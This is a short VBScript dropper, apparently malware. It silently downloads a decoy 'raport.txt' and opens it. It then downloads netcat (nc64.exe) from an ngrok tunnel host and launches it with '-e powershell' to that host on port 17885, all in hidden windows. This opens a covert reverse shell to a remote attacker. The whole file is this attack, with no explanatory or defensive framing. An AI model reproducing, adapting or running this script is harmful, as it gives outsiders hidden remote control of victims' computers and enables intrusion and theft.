
Set objShell = CreateObject("Wscript.Shell")

downloadCmd = "powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://0.tcp.sa.ngrok.io/raport.txt', '%TEMP%\raport.txt')""
objShell.Run downloadCmd, 0, True

execCmd1 = "cmd /c start "" %TEMP%\raport.txt"
objShell.Run execCmd1, 0, True

execCmd2 = "powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://0.tcp.sa.ngrok.io/nc64.exe', '%TEMP%\nc64.exe')""
objShell.Run execCmd2, 0, True

execCmd3 = "cmd /c powershell -Command "Start-Process '%TEMP%\nc64.exe' -ArgumentList '0.tcp.sa.ngrok.io', '17885', '-e', 'powershell' -WindowStyle Hidden""
objShell.Run execCmd3, 0, True

Set objShell = Nothing
